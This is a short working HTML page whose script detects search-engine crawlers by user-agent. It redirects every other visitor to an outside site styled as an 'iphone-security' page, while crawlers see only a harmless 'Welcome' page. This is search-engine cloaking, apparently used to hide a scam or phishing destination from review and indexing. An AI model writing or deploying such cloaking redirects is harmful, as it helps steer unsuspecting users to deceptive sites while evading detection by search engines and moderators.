<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirect Example</title>
  <script>
    // Function to check if user-agent looks like a bot
    function isBot() {
      const bots = [
        /googlebot/i,
        /bingbot/i,
        /slurp/i,
        /duckduckbot/i,
        /baiduspider/i,
        /yandex/i,
        /sogou/i,
        /exabot/i,
        /facebot/i,
        /ia_archiver/i
      ];
      const ua = navigator.userAgent;
      return bots.some(bot => bot.test(ua));
    }

    // Run after page load
    window.onload = function () {
      if (!isBot()) {
        // ✅ Redirect only humans
        window.location.href = "https://iphone-security.github.io/ios/"; 
      } else {
        // ❌ Bots stay on this page
        console.log("Bot detected, no redirect");
      }
    };
  </script>
</head>
<body>
  <h1>Welcome</h1>
  <p>If you’re human, you’ll be redirected shortly.</p>
</body>
</html>
